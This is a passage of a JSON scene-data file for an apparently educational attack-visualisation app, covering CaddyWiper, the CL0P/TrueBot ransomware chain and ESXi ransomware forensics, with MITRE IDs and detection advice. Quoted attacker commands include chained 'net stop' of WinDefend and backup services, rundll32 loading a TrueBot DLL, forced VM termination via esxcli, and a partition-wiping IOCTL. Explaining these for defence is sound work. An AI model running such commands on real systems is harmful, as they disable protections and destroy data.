          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Back",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Keeping the dispatch tower alive to spread destruction",
          "storyExcerpt": "Behind the scenes, keeping the dispatch tower alive to spread destruction captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Alert via behavioral sandboxes and EDR memory scanners detecting stack-constructed API strings for DsRoleGetPrimaryDomainInformation, SeTakeOwnershipPrivilege, and PhysicalDrive inside trojanized…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Policy Tower",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Wiped Drives",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Broadcast Arc",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1082"
    },
    "step-3": {
      "scenarioId": "caddywiper-arguepatch-gpo-destruction",
      "sectionKey": "step-3",
      "sceneKind": "ran-caddywiper-step-3",
      "stageBadge": "STEP #3 · EXFIL & IMPACT",
      "title": "TakeOwnership Recursive File Zeroing & IOCTL_DISK_SET_DRIVE_LAYOUT_EX Wipe",
      "storyCue": "On every ordinary workstation and branch server, the wiper claims legal ownership of every locked desk drawer, overwrites every personal file with blank zeros from top to bottom, and sends a single raw control blast that erases the master partition blueprint of every attached hard drive.",
      "technicalCue": "T1561.001 · EXFIL & IMPACT — On member workstations and servers, CaddyWiper enabled SeTakeOwnershipPrivilege, recursively walked C:\\Users and all drives from D:\\ to Z:\\ calling SetNamedSecurityInfoA (transferring file…",
      "storyMappings": [
        {
          "storyTerm": "Claiming legal ownership of every locked desk drawer",
          "technicalTerm": "Enabling SeTakeOwnershipPrivilege and calling SetNamedSecurityInfoA across C:\\Users",
          "tone": "amber"
        },
        {
          "storyTerm": "Overwriting every file with blank zeros",
          "technicalTerm": "Recursive zero-byte file destruction across local folders and mapped network drives",
          "tone": "sky"
        },
        {
          "storyTerm": "Single raw control blast erasing the drive blueprint",
          "technicalTerm": "DeviceIoControl IOCTL_DISK_SET_DRIVE_LAYOUT_EX (0x0007C054) wiping partition tables",
          "tone": "rose"
        },
        {
          "storyTerm": "Kernel shield blocking drive layout wipes",
          "technicalTerm": "EDR kernel disk filter blocking zeroed IOCTL_DISK_SET_DRIVE_LAYOUT_EX calls",
          "tone": "emerald"
        }
      ],
      "accentHex": "#FACC15",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-caddywiper-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Claiming legal ownership of every locked…",
          "subtitle": "Enabling SeTakeOwnershipPrivilege and calling…",
          "tone": "amber"
        },
        {
          "id": "ran-caddywiper-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Overwriting every file with blank zeros",
          "subtitle": "Recursive zero-byte file destruction across local folders and…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Desk",
          "stageTag": "STEP 03 · SETUP",
          "title": "Claiming legal ownership of every locked desk drawer",
          "storyExcerpt": "On every ordinary workstation and branch server, the wiper claims legal ownership of every locked desk drawer, overwrites every personal file with blank zeros from top to bottom, and sends a…",
          "technicalParallel": "By abusing the legitimate Windows kernel disk IOCTL IOCTL_DISK_SET_DRIVE_LAYOUT_EX (0x0007C054) rather than bringing a third-party kernel driver, CaddyWiper destroyed the disk partition table without…",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. File",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Overwriting every file with blank zeros",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses overwriting every file with blank zeros to advance toward single raw control blast erasing the drive blueprint.",
          "technicalParallel": "On member workstations and servers, CaddyWiper enabled SeTakeOwnershipPrivilege, recursively walked C:\\Users and all drives from D:\\ to Z:\\ calling SetNamedSecurityInfoA (transferring file ownership and…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Desk File",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Kernel shield blocking drive layout wipes",
          "storyExcerpt": "Behind the scenes, kernel shield blocking drive layout wipes captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Configure EDR kernel disk filters to block IOCTL_DISK_SET_DRIVE_LAYOUT_EX (0x0007C054, the raw disk control code that overwrites partition tables) when passed zeroed partition entries, paired with…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Policy Tower",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Wiped Drives",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Broadcast Arc",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1561.001"
    }
  },
  "cl0p-truebot-flawedgrace-sdbbot-ransomware": {
    "briefing": {
      "scenarioId": "cl0p-truebot-flawedgrace-sdbbot-ransomware",
      "sectionKey": "briefing",
      "sceneKind": "ran-cl0p-truebot-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1218.011",
      "title": "CL0P (TA505 / FIN11) Ransomware: TrueBot Loader, FlawedGrace RAT, SDBbot… — Story-to-Technical Overview",
      "storyCue": "Imagine a veteran corporate heist syndicate that moves with industrial precision. First, they slip a quiet scout into the lobby to unlock a full remote-control toolkit; next, they stride down to the master switchboard with a tiny command launcher and flip off over six hundred different database, backup, and office services so zero locks hold any files open; finally, they unleash dedicated locking teams down every local aisle and shared storage hallway simultaneously to clamp every vault shut.",
      "technicalCue": "EXECUTION: TrueBot (`Silence.Downloader`) Execution & FlawedGrace / SDBbot RAT Deployment -> DEFENSE EVASION: Mass Termination of 600+ Processes & Services (`net stop`) & TinyMet Cobalt Strike Pivot -> EXFIL & IMPACT: RC4 / AES + RSA-1024 Encryption (`.CIop`) & `ClopReadMe.txt` Extortion Demand",
      "storyMappings": [
        {
          "storyTerm": "Quiet lobby scout unlocking a full remote-control toolkit",
          "technicalTerm": "TrueBot (Silence.Downloader) deploying FlawedGrace and SDBbot RAT implants",
          "tone": "amber"
        },
        {
          "storyTerm": "Tiny command launcher flipping off six hundred building services",
          "technicalTerm": "TinyMet lateral stager followed by mass net stop termination of 600+ services",
          "tone": "sky"
        },
        {
          "storyTerm": "Dedicated locking teams sweeping local aisles and shared hallways",
          "technicalTerm": "Multi-threaded CL0P worker threads encrypting local drives and SMB shares",
          "tone": "rose"
        },
        {
          "storyTerm": "Branded vault locks and printed extortion demand",
          "technicalTerm": "RC4/AES + RSA-1024 encryption appending .CIop and dropping ClopReadMe.txt",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#38BDF8",
      "durationSec": 18,
      "callouts": [
        {
          "id": "ran-cl0p-truebot-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Quiet lobby scout unlocking a full…",
          "subtitle": "TrueBot (Silence.Downloader) deploying FlawedGrace and SDBbot…",
          "tone": "amber"
        },
        {
          "id": "ran-cl0p-truebot-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Tiny command launcher flipping off six…",
          "subtitle": "TinyMet lateral stager followed by mass net stop termination…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Full",
          "stageTag": "STAGE 01 · EXECUTION",
          "title": "TrueBot (`Silence.Downloader`) Execution & FlawedGrace / SDBbot RAT Deployment",
          "storyExcerpt": "Entering through a crafted email lure or a perimeter file-transfer flaw, the syndicate wakes up a nimble download scout that fingerprints the office network and quietly brings inside full-featured…",
          "technicalParallel": "Under the hood, the observed step executes rundll32.exe C:\\ProgramData\\truebot.dll,RunMain (TrueBot / Silence.Downloader C2 check-in) (which executes Microsoft's signed rundll32.exe host binary to load a…",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Core",
          "stageTag": "STAGE 02 · DEFENSE EVASION",
          "title": "Mass Termination of 600+ Processes & Services (`net stop`) & TinyMet Cobalt Strike Pivot",
          "storyExcerpt": "Pivoting straight into the central server room with a featherweight command stager, the syndicate runs down a massive checklist of over six hundred database engines, accounting apps, and security…",
          "technicalParallel": "Under the hood, the observed step executes net.exe stop \"SQLWriter\" /y && net.exe stop \"VeeamBackupSvc\" /y && net.exe stop \"WinDefend\" /y (which executes the technical command / telemetry directive…",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. File Hall",
          "stageTag": "STAGE 03 · EXFIL & IMPACT",
          "title": "RC4 / AES + RSA-1024 Encryption (`.CIop`) & `ClopReadMe.txt` Extortion Demand",
          "storyExcerpt": "Unleashing dedicated parallel locking squads across every local drive and every mapped corporate file hall at once, the crew clamps fast symmetric locks wrapped inside a master asymmetric seal onto every…",
          "technicalParallel": "Under the hood, the observed step executes cl0p.exe -> CryptGenRandom() -> CryptEncrypt(RC4/AES-256) + RSA-1024 key wrap -> *.CIop (which executes the technical command / telemetry directive , cl0p.exe…",
          "accentHex": "#38BDF8",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Service Panel",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Sealed Vault",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Lock Surge",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "cl0p-truebot-flawedgrace-sdbbot-ransomware",
      "sectionKey": "step-1",
      "sceneKind": "ran-cl0p-truebot-step-1",
      "stageBadge": "STEP #1 · EXECUTION",
      "title": "TrueBot (Silence.Downloader) Execution & FlawedGrace / SDBbot RAT Deployment",
      "storyCue": "Entering through a crafted email lure or a perimeter file-transfer flaw, the syndicate wakes up a nimble download scout that fingerprints the office network and quietly brings inside full-featured espionage puppets.",
      "technicalCue": "T1218.011 · EXECUTION — Following initial access via spearphishing or MFT/web zero-days, CL0P operators execute TrueBot (tracked by CISA AA23-158A as Silence.Downloader) via rundll32.exe or a signed loader.",
      "storyMappings": [
        {
          "storyTerm": "Nimble download scout fingerprinting the network",
          "technicalTerm": "TrueBot (Silence.Downloader) executed after spearphishing or MFT/web zero-days",
          "tone": "amber"
        },
        {
          "storyTerm": "Full-featured espionage puppets brought inside",
          "technicalTerm": "FlawedGrace and SDBbot Remote Access Trojans establishing interactive C2",
          "tone": "sky"
        },
        {
          "storyTerm": "Seasoned financial syndicate operators",
          "technicalTerm": "TA505 / FIN11 threat actors orchestrating enterprise-scale intrusion",
          "tone": "rose"
        },
        {
          "storyTerm": "Mapping high-value servers quietly",
          "technicalTerm": "Active Directory reconnaissance identifying Domain Controllers and file servers",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#F43F5E",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-cl0p-truebot-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Nimble download scout fingerprinting the…",
          "subtitle": "TrueBot (Silence.Downloader) executed after spearphishing or…",
          "tone": "amber"
        },
        {
          "id": "ran-cl0p-truebot-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Full-featured espionage puppets brought…",
          "subtitle": "FlawedGrace and SDBbot Remote Access Trojans establishing…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Lure Flaw",
          "stageTag": "STEP 01 · SETUP",
          "title": "Nimble download scout fingerprinting the network",
          "storyExcerpt": "Entering through a crafted email lure or a perimeter file-transfer flaw, the syndicate wakes up a nimble download scout that fingerprints the office network and quietly brings inside…",
          "technicalParallel": "Under the hood, the observed step executes rundll32.exe C:\\ProgramData\\truebot.dll,RunMain (TrueBot / Silence.Downloader C2 check-in) (which executes Microsoft's signed rundll32.exe host binary to load a…",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Full-featured",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Full-featured espionage puppets brought inside",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses full-featured espionage puppets brought inside to advance toward seasoned financial syndicate operators.",
          "technicalParallel": "Following initial access via spearphishing or MFT/web zero-days, CL0P operators execute TrueBot (tracked by CISA AA23-158A as Silence.Downloader) via rundll32.exe or a signed loader.",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. High-value",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Mapping high-value servers quietly",
          "storyExcerpt": "Behind the scenes, mapping high-value servers quietly captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Sysmon Event 1 (recording InitialLoader=TrueBot , Silence.Downloader, SecondStageRats=FlawedGrace RAT & SDBbot, AdvisoryId=CISA AA23-158A , #StopRansomware: CL0P under T1218.011): Detect…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Service Panel",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Sealed Vault",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Lock Surge",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1218.011"
    },
    "step-2": {
      "scenarioId": "cl0p-truebot-flawedgrace-sdbbot-ransomware",
      "sectionKey": "step-2",
      "sceneKind": "ran-cl0p-truebot-step-2",
      "stageBadge": "STEP #2 · DEFENSE EVASION",
      "title": "Mass Termination of 600+ Processes & Services (net stop) & TinyMet Cobalt Strike Pivot",
      "storyCue": "Pivoting straight into the central server room with a featherweight command stager, the syndicate runs down a massive checklist of over six hundred database engines, accounting apps, and security monitors, shutting every single one down so every file lock falls open.",
      "technicalCue": "T1489 · DEFENSE EVASION — Using TinyMet (a tiny meterpreter/Cobalt Strike stager) to move laterally to domain controllers and file servers, the operator launches the CL0P binary, which contains a hardcoded loop that…",
      "storyMappings": [
        {
          "storyTerm": "Featherweight command stager pivoting to core servers",
          "technicalTerm": "TinyMet (minimal Meterpreter/Cobalt Strike stager) reaching Domain Controllers",
          "tone": "amber"
        },
        {
          "storyTerm": "Massive checklist of six hundred services shut down",
          "technicalTerm": "Automated net stop and process kill loops targeting 600+ DB, backup, and AV services",
          "tone": "sky"
        },
        {
          "storyTerm": "Releasing every active file lock",
          "technicalTerm": "Ensuring live SQL, Exchange, and backup files can be encrypted cleanly",
          "tone": "rose"
        },
        {
          "storyTerm": "Distinctive noisy precursor right before impact",
          "technicalTerm": "Rapid burst of Windows Service Control Manager stop events (EventID 7036)",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F43F5E",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-cl0p-truebot-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Featherweight command stager pivoting to…",
          "subtitle": "TinyMet (minimal Meterpreter/Cobalt Strike stager) reaching…",
          "tone": "amber"
        },
        {
          "id": "ran-cl0p-truebot-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Massive checklist of six hundred…",
          "subtitle": "Automated net stop and process kill loops targeting 600+ DB…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Core",
          "stageTag": "STEP 02 · SETUP",
          "title": "Featherweight command stager pivoting to core servers",
          "storyExcerpt": "Pivoting straight into the central server room with a featherweight command stager, the syndicate runs down a massive checklist of over six hundred database engines, accounting apps, and…",
          "technicalParallel": "Under the hood, the observed step executes net.exe stop \"SQLWriter\" /y && net.exe stop \"VeeamBackupSvc\" /y && net.exe stop \"WinDefend\" /y (which executes the technical command / telemetry directive…",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Six Shut",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Massive checklist of six hundred services shut down",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses massive checklist of six hundred services shut down to advance toward releasing every active file lock.",
          "technicalParallel": "Using TinyMet (a tiny meterpreter/Cobalt Strike stager) to move laterally to domain controllers and file servers, the operator launches the CL0P binary, which contains a hardcoded loop that stops over…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. File Lock",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Distinctive noisy precursor right before impact",
          "storyExcerpt": "Behind the scenes, distinctive noisy precursor right before impact captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Sysmon Event 1 (recording CodeSigningAbuse=Signed with stolen/expired Authenticode certificate , T1553.002, HardcodedKillList=600+ Windows services and database/backup processes under…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Service Panel",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Sealed Vault",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Lock Surge",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1489"
    },
    "step-3": {
      "scenarioId": "cl0p-truebot-flawedgrace-sdbbot-ransomware",
      "sectionKey": "step-3",
      "sceneKind": "ran-cl0p-truebot-step-3",
      "stageBadge": "STEP #3 · EXFIL & IMPACT",
      "title": "RC4 / AES + RSA-1024 Encryption (.CIop) & ClopReadMe.txt Extortion Demand",
      "storyCue": "Unleashing dedicated parallel locking squads across every local drive and every mapped corporate file hall at once, the crew clamps fast symmetric locks wrapped inside a master asymmetric seal onto every document and posts their ransom letter on every floor.",
      "technicalCue": "T1486 · EXFIL & IMPACT — CL0P spawns dedicated worker threads for local drives and enumerated SMB network shares, encrypting files with RC4 or AES-256 and protecting the symmetric key with an embedded 1024-bit RSA…",
      "storyMappings": [
        {
          "storyTerm": "Dedicated parallel locking squads across local and shared halls",
          "technicalTerm": "Dedicated CL0P worker threads for local volumes and enumerated SMB network shares",
          "tone": "amber"
        },
        {
          "storyTerm": "Fast locks wrapped inside a master asymmetric seal",
          "technicalTerm": "RC4/AES file encryption with per-file keys protected by RSA-1024",
          "tone": "sky"
        },
        {
          "storyTerm": "Signature deceptive extension tag",
          "technicalTerm": "Encrypted files renamed with the .CIop extension (capital I mimicking lowercase l)",
          "tone": "rose"
        },
        {
          "storyTerm": "Extortion letter posted on every floor",
          "technicalTerm": "ClopReadMe.txt ransom note placed across affected directories",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-cl0p-truebot-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Dedicated parallel locking squads across…",
          "subtitle": "Dedicated CL0P worker threads for local volumes and enumerated…",
          "tone": "amber"
        },
        {
          "id": "ran-cl0p-truebot-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Fast locks wrapped inside a master…",
          "subtitle": "RC4/AES file encryption with per-file keys protected by RSA-1024",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. File Hall",
          "stageTag": "STEP 03 · SETUP",
          "title": "Dedicated parallel locking squads across local and…",
          "storyExcerpt": "Unleashing dedicated parallel locking squads across every local drive and every mapped corporate file hall at once, the crew clamps fast symmetric locks wrapped inside a master asymmetric seal…",
          "technicalParallel": "Under the hood, the observed step executes cl0p.exe -> CryptGenRandom() -> CryptEncrypt(RC4/AES-256) + RSA-1024 key wrap -> *.CIop (which executes the technical command / telemetry directive , cl0p.exe…",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Fast Seal",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Fast locks wrapped inside a master asymmetric seal",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses fast locks wrapped inside a master asymmetric seal to advance toward signature deceptive extension tag.",
          "technicalParallel": "CL0P spawns dedicated worker threads for local drives and enumerated SMB network shares, encrypting files with RC4 or AES-256 and protecting the symmetric key with an embedded 1024-bit RSA public key…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. File Hall",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Extortion letter posted on every floor",
          "storyExcerpt": "Behind the scenes, extortion letter posted on every floor captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Sysmon Event 11 (recording RansomwareFamily=CL0P Ransomware, AppendedExtension=.CIop / .Cllp, RansomNote=ClopReadMe.txt under T1486): Enforce SMB network segmentation, revoke compromised…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Service Panel",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Sealed Vault",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Lock Surge",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1486"
    }
  },
  "dfir-esxi-hostd-vobd-shell-log-ransomware-encryption-trace": {
    "briefing": {
      "scenarioId": "dfir-esxi-hostd-vobd-shell-log-ransomware-encryption-trace",
      "sectionKey": "briefing",
      "sceneKind": "ran-dfir-esxi-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1078",
      "title": "ESXi /var/log/shell.log, hostd.log & VMDK Hypervisor Forensics — Story-to-Technical Overview",
      "storyCue": "Imagine a huge warehouse holding dozens of locked steel office pods stacked on one master concrete foundation. An intruder logs into the warehouse basement console with stolen superintendent keys, pulls the emergency power cord on every running office pod so their steel floor bolts spring open, and runs a high-speed partial padlocking tool across every pod shell while three separate basement logbooks quietly record every command, every shutdown, and every tampered descriptor.",
      "technicalCue": "INITIAL ACCESS: ESXi SSH Authentication & Interactive Command Logging (/var/log/auth.log & /var/log/shell.log) -> EXFIL & IMPACT: Mass Virtual Machine Termination via esxcli vm process kill (/var/log/hostd.log) -> EXFIL & IMPACT: Intermittent VMDK Encryption & Flat Descriptor Reconstruction (CISA ESXiArgs Recovery)",
      "storyMappings": [
        {
          "storyTerm": "Logging into the warehouse basement console with superintendent keys",
          "technicalTerm": "Root SSH login or DCUI ESXi Shell activation recorded in /var/log/auth.log and shell.log",
          "tone": "amber"
        },
        {
          "storyTerm": "Pulling the emergency power cord so steel floor bolts spring open",
          "technicalTerm": "esxcli vm process kill freeing exclusive vmx locks on *-flat.vmdk (logged in hostd.log)",
          "tone": "sky"
        },
        {
          "storyTerm": "Running a partial padlocking tool across every pod shell",
          "technicalTerm": "ELF encryptor from /tmp intermittently encrypting /vmfs/volumes/*/*/*.vmdk, .vmx, and .nvram",
          "tone": "rose"
        },
        {
          "storyTerm": "Rebuilding undamaged pod maps from partial locks",
          "technicalTerm": "CISA ESXiArgs flat-file descriptor reconstruction recovering unencrypted VMDK blocks",
          "tone": "emerald"
        }
      ],
      "accentHex": "#22D3EE",
      "secondaryHex": "#F43F5E",
      "durationSec": 18,
      "callouts": [
        {
          "id": "ran-dfir-esxi-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Logging into the warehouse basement…",
          "subtitle": "Root SSH login or DCUI ESXi Shell activation recorded in…",
          "tone": "amber"
        },
        {
          "id": "ran-dfir-esxi-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Pulling the emergency power cord so…",
          "subtitle": "esxcli vm process kill freeing exclusive vmx locks on…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Keys",
          "stageTag": "STAGE 01 · INITIAL ACCESS",
          "title": "ESXi SSH Authentication & Interactive Command Logging (/var/log/auth.log & /var/log/shell.log)",
          "storyExcerpt": "Unlocking the basement management terminal as the chief superintendent, the intruder opens an interactive console session while the warehouse built-in authentication diary and command ticker silently…",
          "technicalParallel": "Under the hood, the observed step executes Log Path 1: /var/log/vobd.log (esx.audit.ssh.enabled / esx.audit.tsm.enabled) (which executes the technical command / telemetry directive , Log Path 1…",
          "accentHex": "#22D3EE",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Live Pods",
          "stageTag": "STAGE 02 · EXFIL & IMPACT",
          "title": "Mass Virtual Machine Termination via esxcli vm process kill (/var/log/hostd.log)",
          "storyExcerpt": "Because every live office pod clamps down heavy locks on its own floor foundation while running, the intruder walks down the breaker panel flipping every pod off hard so every foundation slab pops…",
          "technicalParallel": "Under the hood, the observed step executes ESXi Command: esxcli vm process kill --type=force --world-id=2104892 (which executes VMware ESXi hypervisor management commands , ESXi Command: esxcli vm…",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Tool Pod",
          "stageTag": "STAGE 03 · EXFIL & IMPACT",
          "title": "Intermittent VMDK Encryption & Flat Descriptor Reconstruction (CISA ESXiArgs Recovery)",
          "storyExcerpt": "Launching a portable padlocking press out of a temporary basement closet, the intruder races across the datastore locking slices of every virtual disk, configuration card, and memory file, leaving…",
          "technicalParallel": "Under the hood, the observed step executes Targeted Datastore Path: /vmfs/volumes/datastore1/CORP-DC01/CORP-DC01-flat.vmdk (which executes the technical command / telemetry directive , Targeted Datastore…",
          "accentHex": "#F43F5E",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Blade Vault",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Disk Bolts",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Log Sweep",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "dfir-esxi-hostd-vobd-shell-log-ransomware-encryption-trace",
      "sectionKey": "step-1",
      "sceneKind": "ran-dfir-esxi-step-1",
      "stageBadge": "STEP #1 · INITIAL ACCESS",
      "title": "ESXi SSH Authentication & Interactive Command Logging (/var/log/auth.log & /var/log/shell.log)",
      "storyCue": "Unlocking the basement management terminal as the chief superintendent, the intruder opens an interactive console session while the warehouse built-in authentication diary and command ticker silently record every single keystroke.",
      "technicalCue": "T1078 · INITIAL ACCESS — When the actor logs into the ESXi host as root over SSH (or enables the ESXi Shell via DCUI/vCenter, generating VOB event esx.audit.ssh.enabled in /var/log/vobd.log), /var/log/auth.log records…",
      "storyMappings": [
        {
          "storyTerm": "Basement management terminal",
          "technicalTerm": "VMware ESXi SSH daemon or DCUI/vCenter-enabled ESXi Shell",
          "tone": "amber"
        },
        {
          "storyTerm": "Chief superintendent key",
